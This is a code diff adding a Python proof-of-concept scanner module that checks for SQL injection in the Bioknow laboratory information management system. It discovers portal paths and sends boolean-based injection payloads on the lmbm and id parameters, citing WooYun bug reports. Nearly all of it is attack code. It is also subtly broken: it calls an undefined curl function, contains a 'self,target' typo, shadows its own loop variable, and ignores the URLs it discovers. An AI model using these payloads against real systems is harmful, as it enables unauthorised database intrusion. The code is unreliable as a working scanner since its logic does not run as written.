@@ -1,0 +1,82 @@
+# coding: utf-8
+
+from CScanPoc.thirdparty import requests, hackhttp
+from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
+import re
+
+class Vuln(ABVuln):
+    vuln_id = 'bioknow_0001' # 平台漏洞编号，留空
+    name = '百奥知实验室综合信息管理系统 SQL注射漏洞'  # 漏洞名称
+    level = VulnLevel.HIGH  # 漏洞危害级别
+    type = VulnType.INJECTION # 漏洞类型
+    disclosure_date = '2015-04-08'  # 漏洞公布时间
+    desc = '''
+    '''  # 漏洞描述
+    ref = ''  # 漏洞来源
+    cnvd_id = ''  # cnvd漏洞编号
+    cve_id = ''  # cve编号
+    product = '百奥知实验室综合信息管理系统'  # 漏洞应用名称
+    product_version = ''  # 漏洞应用版本
+
+def matchurl(arg):
+    hh = hackhttp.hackhttp()
+    arg = arg + '/portal/'
+    code, head, res, errcode, _ = hh.http(arg)
+    m = re.findall('/portal/root/(.*?)/', res)
+    m1 = []
+    for data in m:
+        if data in m1:pass
+        else :m1.append(data)
+     
+    urllist = []  
+    for data in m1:
+        url = arg + '/root/' + data + '/gyxt.jsp'
+        code, head, res, errcode, _ = curl.curl2(url)
+        if code ==200 :
+            urllist.append(url)
+    return urllist
+
+class Poc(ABPoc):
+    poc_id = '75a687be-f7c8-4364-9c9e-018a44d84202'
+    author = '47bwy'  # POC编写者
+    create_date = '2018-05-11'  # POC创建时间
+
+    def __init__(self):
+        super(Poc, self).__init__(Vuln())
+
+    def verify(self):
+        try:
+            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
+                target=self.target, vuln=self.vuln))
+            
+            #refer:http://www.wooyun.org/bugs/wooyun-2010-0106048
+            #refer:http://www.wooyun.org/bugs/wooyun-2010-0108186
+            hh = hackhttp.hackhttp()
+            arglist = matchurl(self.target)
+            for arg in arglist:
+                payload = [
+                    '?lmbm=YHXZ',
+                    '?id=1',
+                ]
+                for payload in payload:
+                    payload1 = payload + '%27%20or%20%271%27=%271'
+                    payload2 = payload + '%27%20or%20%271%27=%272'
+                    url1 = self.target + payload1
+                    url2 = self,target + payload2
+                    code1, head, res1, errcode, _ = hh.http(url1)
+                    code2, head, res2, errcode, _ = hh.http(url2)
+                    m1 = re.findall('src', res1)
+                    m2 = re.findall('src', res2)
+                    if code1 == 200 and code2 ==200 and m1!=m2:
+                        #security_hole(arg + payload +'  :found sql Injection')
+                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                            target=self.target, name=self.vuln.name))
+
+        except Exception, e:
+            self.output.info('执行异常{}'.format(e))
+
+    def exploit(self):
+        super(Poc, self).exploit()
+
+if __name__ == '__main__':
+    Poc().run()
